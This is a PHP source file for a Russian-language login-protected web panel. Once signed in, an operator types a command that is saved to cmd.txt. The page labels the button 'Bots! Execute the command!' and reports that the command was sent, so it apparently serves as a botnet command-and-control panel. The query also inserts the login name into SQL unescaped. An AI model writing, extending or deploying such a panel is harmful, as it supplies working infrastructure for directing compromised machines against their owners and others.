<?php
    error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

    session_start();
    header('Content-Type: text/html; charset=utf-8');
?><!DOCTYPE html>
<html>
<head>
<title>Авторизация</title>
<meta http-equiv="Content-Style-Type" content="text/css">
</head>
<body>
<?php
    function Read() {
        $file = "cmd.txt";
        echo file_get_contents($file);
    }

    function Write() {
        $file = "cmd.txt";
        $fp = fopen($file, "w");
        $data = $_POST["text"];
        fwrite($fp, $data);
        fclose($fp);
    }

    if (isset($_GET['logoff'])) {
        session_unset(); 
        session_destroy();
        header("Location: index.php");
    }
    if (!isset($_SESSION['login']) or !isset($_SESSION['id'])) {
?>
<div style="border: 0px solid blue; 
 position:relative; top:100px; left:400px; height:200px; width:300px;">

<form action="logon.php" method="post">
    <label>логин:</label><br/>
  <input name="login" type="text" size="15" maxlength="150"><br/>
    <label>пароль:</label><br/>
  <input name="password" type="password" size="15" maxlength="150"><br/><br/>
  <input type="submit" value="войти"><br/><br/>
</form>
Здравствуйте, <font color="red">гость</font>! <br/>
</div>
<?php
    } else {
        $login=$_SESSION['login'];
	include 'dbauth.php';

        $sqlCart = mysql_query("SELECT name FROM users WHERE name = '$login'", $dbcon);

        while($row = mysql_fetch_array($sqlCart)) {
            $name = $row["name"];
        }
  	mysql_close($dbcon);
    echo "
<div align='center' style=''>

	<font color='green'>Здравствуйте: <font color='red'>".$name."</font>!</font>
	<br/>";
        if ($_POST["submit_check"]){
            Write();
        };

	echo "
        <form action=".$_SERVER['PHP_SELF']." method='post'>
        Введите команду:<br>
        <textarea width='400px' height='400px' name='text'>";
	Read();
	echo "</textarea><br>
        <input type='submit' name='submit' value='Боты! Выполнить команду!'>
        <input type='hidden' name='submit_check' value='1'>
        </form>";

        if ($_POST["submit_check"]){
            echo 'Команда отправлена на выполнение. Среднее время выполнения: одна минута';
        };
	echo "
	<br/>
      <a href='index.php?logoff=1'>выйти</a> 
   <br/>

</div>
	";
    };
?>
</body>
</html>